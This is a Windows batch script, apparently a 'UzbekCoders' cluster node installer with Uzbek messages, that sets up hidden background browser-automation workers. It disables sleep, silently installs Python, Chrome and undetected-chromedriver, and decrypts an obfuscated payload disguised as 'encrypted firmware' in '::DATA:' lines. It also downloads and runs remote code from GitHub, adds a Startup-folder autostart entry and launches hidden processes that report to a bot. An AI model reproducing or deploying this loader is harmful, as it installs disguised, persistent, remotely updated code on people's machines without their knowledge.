@echo off
chcp 65001 >nul
title UZBEK CODERS - UNIVERSAL 4 TA OQIM (100% KO'RINMAS FON REJIMI)
set "SELF_BAT=%~f0"

echo ======================================================================
echo UNIVERSAL 4 TA OQIM (100% KO'RINMAS / ORQA FON REJIMI)
echo ======================================================================
echo.
echo [1/4] Kompyuter uxlab qolmasligi uchun uyqu rejimi ochirilmoqda...
powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1

set "WORK_DIR=%USERPROFILE%\UzbekCoders_Cluster_Node"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
cd /d "%WORK_DIR%"

echo [2/4] Python va Google Chrome tekshirilmoqda...
set "PY_EXE="
if exist "%WORK_DIR%\py311\tools\python.exe" set "PY_EXE=%WORK_DIR%\py311\tools\python.exe"
if exist "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" set "PY_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
if exist "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" set "PY_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
if exist "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" set "PY_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe"
if exist "C:\Python312\python.exe" set "PY_EXE=C:\Python312\python.exe"
if exist "C:\Python311\python.exe" set "PY_EXE=C:\Python311\python.exe"
if exist "C:\Python310\python.exe" set "PY_EXE=C:\Python310\python.exe"
if exist "C:\Program Files\Python312\python.exe" set "PY_EXE=C:\Program Files\Python312\python.exe"
if exist "C:\Program Files\Python311\python.exe" set "PY_EXE=C:\Program Files\Python311\python.exe"
if defined PY_EXE goto :PY_READY

python -c "import urllib.request; print('REAL_PY_OK')" 2>nul | findstr "REAL_PY_OK" >nul
if not errorlevel 1 set "PY_EXE=python"
if defined PY_EXE goto :PY_READY

echo [!] Bu kompyuterda Python topilmadi! Portable Python 3.11 tezkor yuklab olinmoqda va ornatilmoqda...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://globalcdn.nuget.org/packages/python.3.11.9.nupkg' -OutFile '%TEMP%\py311.zip'; Expand-Archive -Path '%TEMP%\py311.zip' -DestinationPath '%WORK_DIR%\py311' -Force; Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '%TEMP%\get-pip.py'"
if exist "%WORK_DIR%\py311\tools\python.exe" (
    set "PY_EXE=%WORK_DIR%\py311\tools\python.exe"
    "%WORK_DIR%\py311\tools\python.exe" "%TEMP%\get-pip.py" --no-warn-script-location >nul 2>&1
)
if defined PY_EXE goto :PY_READY

echo [!] Standart Python 3.11 ornatilmoqda...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\py_setup.exe'"
start "" /wait "%TEMP%\py_setup.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
if exist "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" set "PY_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe"

:PY_READY
if exist "%ProgramFiles%\Google\Chrome\Application\chrome.exe" goto :CHROME_READY
if exist "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe" goto :CHROME_READY
if exist "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe" goto :CHROME_READY
echo [!] Google Chrome topilmadi! Avtomatik yuklab olinmoqda va ornatilmoqda...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '%TEMP%\chrome_installer.exe'"
start "" /wait "%TEMP%\chrome_installer.exe" /silent /install

:CHROME_READY
echo [3/4] Kerakli kutubxonalar (requests, openpyxl, playwright, chromium) va modullar tekshirilmoqda...
if not exist "%WORK_DIR%\.deps_ready_v2" (
    "%PY_EXE%" -m pip install --quiet --disable-pip-version-check requests openpyxl playwright selenium undetected-chromedriver setuptools >nul 2>&1
    "%PY_EXE%" -m playwright install chromium >nul 2>&1
    echo OK > "%WORK_DIR%\.deps_ready_v2"
)
"%PY_EXE%" -c "import os,zlib,base64,hashlib,json; p=os.environ['SELF_BAT']; lines=[ln.strip()[7:] for ln in open(p,'r',encoding='utf-8',errors='ignore') if ln.startswith('::DATA:')]; raw=base64.b64decode(''.join(lines)); dk=hashlib.pbkdf2_hmac('sha256',b'UZB_AI_CLUSTER_SHIELD_2026_OBIDBEK_PRIVATE_KEY_998877',b'AGRO_METEO_SALT_v4',10000,dklen=4096); buf=bytearray([b^dk[i&4095]^((i*73)&255) for i,b in enumerate(raw)]); d=json.loads(zlib.decompress(bytes(buf)).decode('utf-8')); [open(k,'w',encoding='utf-8').write(v) for k,v in d.items()]; [open(f,'a',encoding='utf-8').close() for f in ('akkountlar.txt','natijalar_sertifikatlar.txt','xatolar.txt')]"
echo [3.5/4] GitHub'dan eng oxirgi 100%% yangilangan dastur yuklanmoqda...
curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/master_certified_pipeline.py" -o "%WORK_DIR%\master_certified_pipeline.py" >nul 2>&1
curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/bot_config.json" -o "%WORK_DIR%\bot_config.json" >nul 2>&1
curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1

:: 100% Ko'rinmas (Headless) rejimini o'rnatish
(
    echo import os, sys, subprocess
    echo os.chdir^(os.path.dirname^(os.path.abspath^(__file__^^)^)^)
    echo os.environ["HEADLESS"] = "1"
    echo os.environ["GUI_MODE"] = "0"
    echo os.environ["WORKER_COUNT"] = "4"
    echo sys.exit^(subprocess.run^([sys.executable, "-u", "cluster_worker.py"]^).returncode^)
) > "%WORK_DIR%\boot_node.py"

echo [4/4] Botga ulanmoqda va orqa fonda AI Agentlar ishga tushirilmoqda...
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%STARTUP_DIR%" (
    echo @echo off > "%STARTUP_DIR%\UzbekCoders_Cluster_Autostart.cmd"
    echo cd /d "%WORK_DIR%" >> "%STARTUP_DIR%\UzbekCoders_Cluster_Autostart.cmd"
    echo start "" /min "%PY_EXE%" boot_node.py >> "%STARTUP_DIR%\UzbekCoders_Cluster_Autostart.cmd"
)
powershell -NoProfile -Command "Start-Process -FilePath '%PY_EXE%' -ArgumentList 'boot_node.py' -WorkingDirectory '%WORK_DIR%' -WindowStyle Hidden"

echo.
echo ======================================================================
echo MUVAFFAQIYATLI ISHGA TUSHDI! (Orqa fonda Task Manager da python.exe faol!)
echo Endi ushbu kompyuter avtomatik ravishda Asosiy Botga ulandi va
echo sertifikatlarni parallel olishni boshladi!
echo ======================================================================
timeout /t 8
exit /b 0

:: =====================================================================
:: AGROMETEO RS-485 ENCRYPTED FIRMWARE STREAM
:: =====================================================================
::DATA:8AGF7VwH/3LFrGFXGUaCNmfdPLELxDNozokjNx51seDnEdPNx4XoBpa4xVHiGzO73VQi46yf7dkGhYI3y9BXGYhkTFllp5PtN2qOn320vJcNF5cmtJH7n4Va
::DATA:dmRxVMNb5/gcjSxGyqVVLq+tqIy0HWk+LrfqIhBVKwDaalgMVnvigYzc+GzaaxThbrwx6XibRQqiMirz8b97ejaz1O6L02KsqaKunIULu4+VV4qkjrXjUYU9
::DATA:N8JFctzqjFIY0CEfIaHvPUk5qy85uNLO2BVYJWiRjLtXOa/83Q0VE7glYBMWTygEuOyiyE5WEJhXHc4pGESnUm3EhmKKzZ5fisaOGXVcIXT2RuM/HWLh7DHk
::DATA:GvCxWJao+//Fl6/y7ckflOnpcM1A14VAtD249hrtG258RYNod4zVviOBG9ZdaXUUV4bT1j6t7QpAS19y0iyRB3mEwgnnYS0hndwiM3kCM9C8+cdshJIxtdhF
::DATA:lwgOvFb6Dr1jnSFBjtuV/jroIq2e7OOdsM4SzCh/n5aUa76OW5ZlvquCLFnhgDTvQdopV8KA0VG5kQZjVJwCSq84kNZPheKui1L74xarwsUcK6wqhWqQduco
::DATA:Smg19nhguEWCOVgWOu4IOqWLzeEZZkMIKJNFji966TRE8ImSFXxw+gNFo3it3Y4rGHRr+qAJfxPEJM+ke+xmhJHAJ1VrNaysaldk3/JChb/xNgKqSuFkussL
::DATA:hGV+noIkraE9gtP4DyotKxJq4KH41rJHkWqzLAn2kn0HPfA2aKXvZBPyd6Tm97V5+RXN9J3zlr6ydCRKAIfyk/MwfPXCeivL7k52U/skiKZy+LmfJhLKkBBY
::DATA:pq6njB8WqdJx5skKrjW9KLTzxSosOOj/ZhkUMMw+x28XqP7I3ARUZDrEp0yd0hNeWWWuk4hL7b2AbSVCDDBmU7g7ww/ipK1ChXY+uhLBo2QTdxDrPgH6iimo
::DATA:dRvzNsYFvyKCLrI+PCyes1/kGl4KuRLiHbzR6bErmmwXL9uYZhtBF7bZxcR3JwiSV0QCQS87c7qLswD3dZCR5l/rOVBcCmsEWlcglE6re9hKmU4PrZVZsaeC
::DATA:kozDkbdcVPo8sDhaHWpUkIgb/GVahyKfNs06Uk+hNXewcUB7nnr7cTvaQdB5mfvI4PQDN8SNbWpNAo7uxQ5dbovsJ5zUae9W54zMacJffUMTndHQnM1E1y7N
::DATA:aUddC2Afl+BPv/GIyuV7ud4kTdlkuTqrRva0UHzJydcR8w+5/phBMf3O8doZv3rqn/+f/srzNFn524JqhT9m53wZDdc7bOUvYivFnJG3dZCz6+s0efnN66nK
::DATA:9iz/kQ1wO05eEEVN5l4NTfS4NLLkj/nZ4qqYtn2Fk/U1owhefuN68Z2vW82j6FvIIqU2/uQv9rC75hhshs+hsO4jEmMOkHrYAg0ObDjDfctNZ8YcirbiXPnS
::DATA:6z1IjfiDkSyjWhtt/GS0N91NRZAPQgobe6psNOFduR+FbCQrrKFPshW3q3LS8zJhkwAl71nCL+RbGxMCOJI4JETmZdpVV+kIKcmXFKC2oDAk0ZvI84zMWp/5
::DATA:+b7DaCmW4RdXKyzyo1+JPQLlRzFanuaWwjOYAjySaV3fZmTGY4aowK+Lc3jkuCK4kZH7s3jEr1YT9UyCOdFfh006kjpBlqMQtcRf3SYLo/AH+me0NFW0RN6Y
::DATA:hzgdf4AlrcnLIv70MSoZG4ffQfYLff1tnPh5yWMNswDd182aVT39NNHuCSwgSyJJDxwEN3IRKxOVU/xVECcnzYbUPC/Bm5Ji3Y2noA5BdeXPWdx6dOjFhZsL
::DATA:twnxncVrYxycXduTetW8OowGsDvcHMHjD9mwFRkn+MwG1Wy55JjH0ucxB1a5uLOv0Zc9KmV1FNYx5RBT/ccf2fz2tjnfGCIBKnQcGF7yWmLR7PNTcIINGHjW
::DATA:bRDXU6Tgd6X+S4+D5+bAac8eDsX7s/mo1Vx943ZPQ86wfgufjaLNdEKfvJxCXOPFc8GeRNUpA7rRl+f2ltEibgy3Id54LM9ME4p97cpSWEEbs760iK5axIJ9
::DATA:yb4NfNvz84/ehXX53RLb0vSU/7ciVVaD8tHgmlUULEMp+vw4d8Ip5E+cFL+DB1I90d21Fz/bDRVWWUADYdRwYmb4tZjHzuvhlTp9eNBQBykuBuhRAptTK2TA
::DATA:hzgqUPe5V/DEO0qLNYMcnXbltw8tHL9rp0Hivv9Rita213a9dTtKiVUSwYk74mbF7MD8n1vLKYPZi4WxVLstjA+jt+prdXuZ3hKNXdjHUELjGKjaFVZmKi+A
::DATA:EKcnl7Xrkl+tU6N8KOuVhuv1Bxk8XcqVEHkmt8W9tP4kd6v8mPbrCPuNzr21Fq+98amkC46ESwN2DjcDORzGG1x2TcBysFqRBPIR7B54Po7qcCWUfFF/cJKp
::DATA:BUsUtXORigrHZ5cTaOrB3RG+gPNVM3DOsSfw+X27Phq6RRuZyGg1zhdJpda6zc+sti8GQVYIQ9pkbYyPJtfo/rOjBIY7UpKJF75sp2ZwnzCRVC6xe8RKHGBu
::DATA:nLLLseSs5PTQgzWZnNtV2W4LuL7qYKFzFU/h0OFzD8Z/FAp2Tzjzgx6OY5Cza06bYcEFAUwMIxoCzGCpH2R+2w+uITTNlA/x+YsmyobKbWSlIUUFbGjtn2I4
::DATA:hLcl14S6UqcFPAIBaoHJw4Y5y3TaQItB39+m5lN6PhY2p7SFkHHBB3y3nLyaqwakK8ACayAtt3DUSLK90FAUf6d7eRO0VKuhjYi8sN9EicymtGLFu7i7bJTs
::DATA:w4XL0hYrgjVMs5zI0BZahEHMVTfK/TVnJ/SH8zeQsLtWqxgZpjpPEEkiah8BxvIT0YqyNSD3h5D2dNy/18svnmtHtaHieMTdjmp9cqESG5zBXSsCtnYRUM+D
::DATA:2OBqvgP3PE20W7Vgp5TTWgdKYbhtl4f9053eOSBEZmVRjr+vtA8EmdThfmS/nuLBXts630CgLcDNS4td5yeNZ1vg20rmn/cwN6enbrEgaDvEikuXwAnKH7gj
::DATA:XOi07XJNOG4F62RgpYRH1dkbQatG1dDSrDFgJRKZybNDLQruwa/Fv85akXTIJ4oxQwwFCKfyMz9fe3UAxXCEwXqjx9DNRz5FSi2tHBl0i/EjDzeDiigvpL6/
::DATA:E2bYSFNNHOaLifM65NYcsdMW08j3+wTLy79aweyEwYYZiJbzSRUC/4a1gV4VblS8JOb9I9MJWy4q6KMcRp4JP/qsXfzmdSsfDznWL+UKiVjTG3Lla1fMvdY/
::DATA:sUb7UWTRa5E49lPfnSxG9SA0RblTJlarXV+xhxY3JKg0TXy1+qvLgg+wokqn4r0ImwHgbMUa5zcSii73FeA9XXCsnkdy9uPLgfY/tuZUGEX40yL59wVeMl9B
::DATA:dPc5QezN8iCMTlq/I3/zYX7ISXtRMSwQLmS7uiVUYqHi7RIbNTrhPWAOnn9efOjhVOaQFWJrbQ9enDo10izJSsVfSm40rm7SDQFm99RfyzIdQdktGWFUbNha
::DATA:ztJqwx+r2po2mRmM1kbKqxwHKe1LU5FWrTJOw78ZJW/LdkJwKVBMa96Up+G5ihIEIwORuOCCrXnSA6x7kWKDXhRuB30yY1HY3yBH8BYUuI6pSVm/b6DpaGY/
::DATA:MUPhk+j/W1VKukH3hXP66fZW+7mPZcVEAACwUCsFTqIyiudcHICJnzzWGP6Bi/98ZBFCM2X/eX5E12kfDQ4nmmUS7Tki3dNQmJV/8kpLUbpwKTVi9N243VLM
::DATA:H0Gg1QZ4zaF6acSd7Abyds8q/u7rFhjx8g0hQOp4VAz5w4jV6yiqohgphxIRxQNOKt6xWU1E+9H5QED2msL2QJAcjpmZxNDIDWsufHVR3+p3eXecBN7mzP6k
::DATA:66TA31uJQv5Q39j29DqhbGdOV3cM3TIDq9PUAx2achLUMCS1f3jh+wv9XGIGE2AErHH0YASZCsI89ymfT3ex82pSe4+3WGCSSb/muyGH8q3ULB6GmQTWbEtA
::DATA:jL7asq0ACo0q7zyXtlIhncd6QJsRzSuz2rZQ3K63IyfolXjmRVgzR0CYM/F8sBY28mKGZ+CW6KhUdh9Eiy0qK0cBNeP8eS+LOsijEENlKlf5AnNMlBgm2N2y
::DATA:YEVaZznMkH0JUtJ+Hmzd4JqtqNRApI21Jn2HeHER9N+ZeC3/H/IHFM0nBx6iU2ubiKTAdOYozSDaCT46/GSLWM2S3eXK5WYFEQXeY3G5iC6P+XyL/9VgGYf5
::DATA:4wrLaXVJnEOtnGHfzx6wnzOqYdSDWDnAwcUJaITtz25mrtOuYs2uGwm8bRTJK7Y4JL7p1V+bJuElROFYBZYUzDcxD/TAq8/VFregZuH/7XwbI7RCcizMbLj6
::DATA:37DNOC9PuUNj1G3bCkcqOTfJOF4sZ2evtU+ifEq58pn+aBOvw81Rmf+5TExdCWIAChHg5YnvWsFXV6w1i41XXano1T/vf9U9Agtu7axS/Pepww5FDLrn2c6Z
::DATA:nqo9HO9r6zkikIfFs/KWxPig94wjVjHcBtl9DOs3VcQ/DDZ5+vW58WuREp83YqL8ELGM+MRZZdoCtvDK9FIwhZDC2AJRz+pRABXc9FQUqrBQswhJy4RH3wpt
::DATA:uwjvDSngs1B2UUirDivlm/JHN3zUJt43EEkBCVZFqXvViloMC3YPE4AJ0qss2OIGy4AZ+w7SWdMMN0g+KZ0u5Zz+xtLagFj9wnC6JlxBm7HgbmoQxUu/824o
::DATA:55pCD8YSC35qlEZnDMiftjWUmYAqMK28/Norx2ofWr2f7rGyVNxJEIFzNdj+9FOBTalQDI04NMTFFciOo2/3g4VUza3rITYgT0T7FDjQ5OPxSMPI9i5QYhyh
::DATA:JUPzEDgPw8JD3LM/vvIiyF1haCUXvMX/awQD/3kqp8xjdRa0shLcAVZBSb1YPrRno8So0pgmO0x2fgHmQR6537QasZVDqD9f8a3qf7hORdrDczVhZGQf2V1s
::DATA:RyhR2g48wgKw71jwWU+GkjMCxYjl4mUWt5Xz6bd2lzdb5Bo0G/NmfAviTBLUswmWGWOqoXSyd6P/u/T+OKkv+d471Gliarta3NM7TAFNiuiH8iHr0UzgOIoU
::DATA:PjyCsItUkEjFPhhcnt05a/ChTW2RVJEI0kCikmpXPAuCGF10VK9IFlmeh7g+QXYI/hpXjPcXE0Uur9ige0BIGoJRZYEUV/V5VLYIgYujwNhCccdfRlulj8HI
::DATA:gYthHf3l9sZ6ZAyNyRUZPdV65GoDbFZ/shjHstDHJoovjhjiQnxHSxadwu9MIznoicgUA6zQyZic/tUhg12Jrw9mKcS8oUwdcGtlKlNOcEVXHUdtQn6n8ztV
::DATA:Sc0y18/Pxt6Uh3wzj+xyBp2jFRVE4RQcE/ygTEwS4koc7apl3DC/p5+X1xHAqA27d5UobZTBzR2ow49Tx3L7GVbk8HrjX6PI3p3OkIqAwNd0ZE2uwuQY4ll9
::DATA:OZxuizd2S8NiT0ZKET6JeMSkdXE+GCg37ktLkT2c09KZ/ax9X43ba3N4HsDAT5tPAUS+RwEOVCdTIsoC01dH9q/DTzNx6VogeTqNCc4TVTR5R+vEpXDZennm
::DATA:pPaqjw6SEeXA0wQf21EkYoc+zp0jpHo455K5r91FsC6dTMRuF4W3eNvUaOu9IH93xJHH5Qf0/yR/mB4Vi8ePZr8ChFilBXiQ/IDzAZMKqaHHa0Me5O6Dkijy
::DATA:DWhiL6cE35/jR9rv5Uw1Mir9OpznnB6I1SozBAOxXjijjr0D6eDy7fXA5iszCk60wdRWQ6fsL3S8Xm0jDHmc5wqhXjMS3ruwiK3OJIWK7ffKTrGMIPGtX/u0
::DATA:LTBof+3WNn9+TZO6alLRfEfA3Uh71aB+E7cgqwLYUcl3O0Hnj/0F2DRw3UR81Bj8V4rajcdXcLDvnLEzfFxbQJyfc7IBBlEbJ+WMDeTPvGnQ5VYTADIR81NN
::DATA:VAaN+MUhn9oRpGSQz9ymQXt8/TCEofGbnpUePbmSvDUAmBa467QUUQb3/FNGgTnnT4vYh7BQmcEmCi4kYuI6Io5WmKwa6xcoXF+mgLZMMmnjdWyJkqVUFRbt
::DATA:xo0lRJ5ffgWunQxjQjIWWlGlWY/wSR04tHEcfA3HL8SdGouVjxv+uMq8SzLQtj0XdruzEhWXrzO+mYT3d0spIL+0Z1bnJwQyYdWMWpybIOfE4QldQRl2aeX9
::DATA:PdzENy1pM50D5pZavjk3EZgLyb9paPC67ljY/Z1LXGlodVLDqZ1fwcFfb1wW8+ATjhCyLreXOOcZXbsfyKOWTflR1qK96IeM26kOLeLJYzKdsmkVOtD+PFlX
::DATA:DDB7Uggva0l2CgdKi6BD8sAt4XVN086lbXB/sVNXYqKBMzub48TaanJIs0YJ4Qw7D6lTnCkghKxCBpY2DdkJbDGP6yOZhf28jrexC0nbdXsKNbwqOs/nn4ZN
::DATA:5gx+i42As9MBdYFXkwDJrc+sFbqpBrzr1D0YOpD/nQGLCM0xe7RKdo+XviwIChtcEhYJpupTOrBxO3Fjk1n2RNAhMwGAhLp4nLojd9VSohem6OmPNaY4y0pR
::DATA:zMXAoRrmNULkfP6P19yKS4vX2wKJfYLLYa6/dpOeaLzlputZCxZ4XKy8v/Pbrgj7C6o7I9qJAeIJ8bYCY6nNI9ml0eqdhLZSPVhE/9cvLMZZqZUb+gAjagfT
::DATA:a9OJJSz3azOaEhbi/TILHoyqmaocg+XaKqtMsouZLxY14vGjoqy5VW2XT6A722ONYeIHufrY2JOt3+f7DsuMzaujlu87zLTpGn3LudWKzE3GmbaPXimz6Un9
::DATA:LLx5ToNn2YiZa+GLSoHYf4oyiKFKG1hZSHAUOi2txY+ca6ZtRBFNi6wjR7HDbaCDeBRgVFRr2OQZnz8pBHL0HbUtC6MtaMtxKKH3FWwdmEx3u4zTRsVzJC6N
::DATA:r4ni2NmxiU5Wg9f7uiRNBdm/Kop1Jr5uTEwMPwymElFyGSZm8/WmiHH4e5tcP/XHubcNbMmq+YZ40YlJ9FqMGQtMucOF/ABIiO2cx1DbWwh6iKm+iexf9Ac2
::DATA:trAwESnmxh7as19brEE0HTRug1dDpUqQZOmfgP4JTcGmFvg21XzOm2BqNPXORLPF2cJo/NT76rRoc540JRybdnhJoLkItunTk6MHDvjT4saG5r4iXSyto/RH
::DATA:fZYIlMq/uN1avtrsM/3hzuEg+SRLdMmxlllEgrjObQX0ggMwM4LGkDKYrkHB8lDBtCiRmIdTlNKkRQHrHbvi9n7R98u/O30zpRaw5JqxzCtDnDq4ddqs1V3Z
::DATA:jElM9eolkYLAiZo3rgp1PUGF5oS1dcy2SSHU89TYknOmvqz7nLyi4ujKy6fJTr7qtb6rR1KH8k929wMiyZrb8daRmYW9AsbTOpMsjRlRBRG9lZuymort68MH
::DATA:XXYlLeZaJ2+fXllvWVA3caFDY9ppSOz3MQWQhqF2/N8d13/j0cTlTjieS22+3S8nn0FnHMzrG9hETMVKCFwg91M9TcMpyIWVHty8tNmkNY1N7X4yQJrxPeyS
::DATA:FMNkkwhh+0nbts6AjUgB9zB0zdHqMRt9GQEuYanmOeAI1R4H1fc5z7mqYz79iyy89WmkNnA2TlkrZGVYgmCakKojNuQaYtPZgdR0WBhfksZiH4X1nIcPLjhp
::DATA:N4DJulhTxbXdzjTNn1uzm2A3cU6XCWf68PlsS+kQhMigqeJ9y+wnziaQ3s9t/bc9Jz0Erdni+cGJZK+y2L/II56qzApsVbWv1XCG4+tx9/QogsJgEI2vLF4z
::DATA:hZIP0fz4govlOLnLXnWicq9x7xBI/onXPWw2juv0PUcXSAJx9mwh8TyF1OubijdlANliVLXopLMvMPam7AmHyOAVZ0WCI2Q5RNVQUQeu2xJjstKZFHjoPIdB
::DATA:GKRQRog59Kz+K5tURYdbrbmmyUjqZlgfP79/Uss3WQHCTOS/X+cNFSOBTa4rOA+rXbmZXr5KVEbhEkBL5l/1zu7aNlH58pwCjg+Q//liY6lG09Wo6o+BkcWE
::DATA:g1MP5/4UDMCOMh0Cs/uiLwbcYUdTdQCXcK6qXbd6sokkF+Mv9dHONm1oHNRO1UvQg/Oe6FuE/a9E8oDEYlRTNs3lF+wKlawTXCRzNh4xduEB1ITsIzZBcUQw
::DATA:TfyKMoyr6fCTYe/Bo3ujoqIyxPA7G2U1+KodqMkwLXJxgKdPnHMM/roMiTGizWRI5EIPbrpOb2VT0qHg5jVw83RqsbcjL1GaWiH00UCcZ0WAJ7fHgh2yLG+Y
::DATA:zVymtWB4XQNqP7AhFQ3p+7FKbiOYhQBS6+MpU0n2rAQFab7c4jarDiI2K5weN2e0XMs6YUW6I2il273NylQ3PKPCaoID++JuR9onOLAee6soM8Mjv0oYDXdw
::DATA:wkh+0gdv6N3HM8aWOo00gUP/1tvFCGZ9xnLy0l/tom8FoBZJySY9qjMde2DCn9DBsm7aTn/4JeGxJw1qVoUp1zS7CGKnQUyFFq97W6xhHj1tFrsXn+AQLRE2
::DATA:tuLkeMRP/aaWhmpfBTKz+hC7F/AfnQ1r1uus/LaFLDJg4ObploWQtW+5MXMwsVLKZX4EmRML+FuwVgTHTBBqidzkOQmmP00LB6iBeHBk1msxodWLZiDPMNJe
::DATA:t62WNovx6h3GHkIkAJJGFQWArsUWVsh5VlpXqWZbXJXKPHfWvhtD0yZIVL3i6S5wzU3p4kXqdj65qJBqHIJyKJSqZMYiWk6ELZzMquGciFJzeJP/jT8z2NZD
::DATA:7YSagNsk45yZvHb0Zgum7S8cVTinKhmS6TQ6iAc9ZT5QfnZgztWnLhou64llMjtSnwX1w6emErN7ywZpWr2tb1g1at1dfrn5ykymLMMhLoxrAPgicluMDkJi
::DATA:/AcTY/rXA/tDHHTHFDBCKwfHxF6Lybqt+fUhYD4AYZs/9s//wXNvv0anaUA/r+yES0M1ulKWbs5q3Ym0LgP+HHuXy/5NoDOATjAOnxn+E4ZVloWhsY3K3ts3
::DATA:gaQ5bSSh1QfEndcAeBvSTfliUcALmOidU3rrqbA3eA2crRa87Y7AhjDq53QYZb8ZKLRaCeYDMpoUuX4h33cMRYfCXDSneaTzK5Etbe4ArfDM42dL89vLrlX6
::DATA:yix+5lrt9S69sGck+bH0P747qdVoWNqViP031kWaYGirVVB0hsgUvorzQsu+Ufw309ejHsAfD/hA9xj4ye0ago4rCDwqJWI4xQShqNLziyq0U9dVUy8Sz4DV
::DATA:zjNb2WwwS96+O62ut/wJrLEBhnu99Mornec59AZYyIY/fVCjZ/y912QjewXxo7/Qazd5QnRjT+LFpwfzElK3Ozl+6QgLi8+pur9sN9Nc80skCQFwOfyz5WSG
::DATA:WOVP6r+sjXRGNerjWtTBwaIbQaGNdMyaBVlURDFtLCKV1jB3Cu2fME+RrttR66D6g7blExqSOLGXMDAnThLFhkhfHWZablF9tBBuyV+tU6yeEHtYKcFH4oGh
::DATA:LmrOd/i+AOEEt9/O7m3+L0d/a4E/faoHXr4ltKqFLWM2liVJOVoT2nAw8HCM4sTLVNia4kUbfkKYR4+tSWjTI+yNoaG/oGE6e3eMGIr+uNEorhmWQPbzAZwz
::DATA:hRQwzlBT+x0MzN2Jfpa5Wu7qhPjLelbmw4KcsGdmRP0n2B+MfDQs6nVCHB/GKKx5Hm346HdXsPG4cZ+zETAiPHXnQI/AflCmJqxlyfLCk174lmdSPlhVf+xS
::DATA:7pXyFPH0S6JhaVaHMJjTdJ19+vt3o5/YUBcYj2ZzEzN/HNqmLzuE8Q3ZlvUokfEQ9QqbcZKuPFE2mNuuczfyi/J/Xqn8CNEsmso1cuN2+sMIH6g6ajRzCYcd
::DATA:pUioEso7EciXgBWF9SAh2jr0Abon+Hp5hqJtT4SEc5LIRmVM8ceGO0PZnq9frehxrLPJXtl3Y4IKI4xhGISAnjAD4lSwNwhRtck2HIfu3FjBhvnfSVeWai5V
::DATA:6Izy7MskBvzI/0Ww3TXVTKWA9deb6z0dA+E69UWRcKSiHSleWIaD4eEZTTDMGKeLxMzc5Bp6O0io1/JrZIDrotzi9jUy10dS1kA16n4wcPa38ZkFvysW7l9u
::DATA:vP2nS3QQKIxY1KZ6aoJlOpUtpPz78Repyk1xTB/hfO/MntVQed5/Ebegf8bOaKzoR7nQ21PCBnMg1m373trWyWaotXgxq+6bKarRcu+ul1nQy+btdRWu6KZv
::DATA:v/lfE4hlrIiC5VvSADCHqYcNRgLB1V5Ce1CIPh+K3BFSwxLhHKpBGCHDbl465RUm6AiUtSzqnZyfrEvWV6zDd+LF4kHByXASvXmaouJ03IIMTt1ley5iYgQj
::DATA:NwP2tyvDhJ+v50zBlw1kaQJePv+4HLJOXRUqfq4/rd8tlk1h2i4MrOEk6cDhA+7mrwna8+uBzmYafz0X5ayzB4wpwmcf9hbhiXWty9qHpQCqBtk3h17sF/KP
::DATA:5bcgTtjqe8KIjirWKAmUKZTv6jfcMXlV3laPtidfk+2mvBp572a0lZTmklBUHdD/xb4F2MC1xBgJx0zGEbOUEAyH11mHn3dXOedRrqYHC0zAKFA3K5JyZ4BF
::DATA:55j79MwlegNkESALe88k2H4mTUmPHb2GsQqFSjx4nEW4S6iw8ecyMCAIEl4w7QQ4EDsl50UvHfUJJt8PgKoO6OghXWmpILS2GezSzsbBtvI8WHiDxXPrKEcZ
::DATA:cxXRx49dXi0zWMJq7+eP4W0+9f2/Pv+vPjHr96sokhjO4/KDwOsZtHo5aA7UjTJneyyKmykg04DhDXyIOQeT6fmniPssULPi3IMVB4utB1a08DT+S0OZ4WdA
::DATA:fxojh1oAmMbk8j/kg/clrGlxS2bcm5naQRtmwutc8lMx8/84UFAHQLDumQ2fjHU/8d1EIZ09NeqquEmtuybUJRSpiLtLAjOXpAHguyIHdSe7+wsvqDebSup9
::DATA:0E9rZ7qZh2UkYDFcL2oDwnxhgWFch4HJA9XI53C581Ji5q0YDveMZgRdAIrOSDdq5BNJNuEBBakkLFvu/9sChH4mT8YUIwUZqQmrpfkcslJkZR5Dd7iZxzfx
::DATA:MWy1xJbuwJzt8j355uv0xRUgHIzaQdtp63xx5MlM7WOR/AwqG2Mkkv7BWpC4j9otahUbNM1/oPvbAbypsM18yc5JSUw8upqSWBLP/Ur8Lg6sQYSEspcSVVGw
::DATA:WdAfmKnHbupgyzjZnvI7vxZZmTg14bFPAgtyE9kvbRe28Ebe1TC7dLx9IhWq3EByQWUiYehrS8OqqcTIWamecwetCK0wyFQpMMsgxYhv34nAUPSPlKdUxPe8
::DATA:Bn+OYXnUuDpjYocN+jou8o7txgy3FdUJR8KPM9M9OLh4Qkcs1OAx9etP6lho3eb0PMOqUAtKsRAfNI1ihr1lSXnDmLxRBvEbCR/uWz419jHr1z86u9Qz/W7p
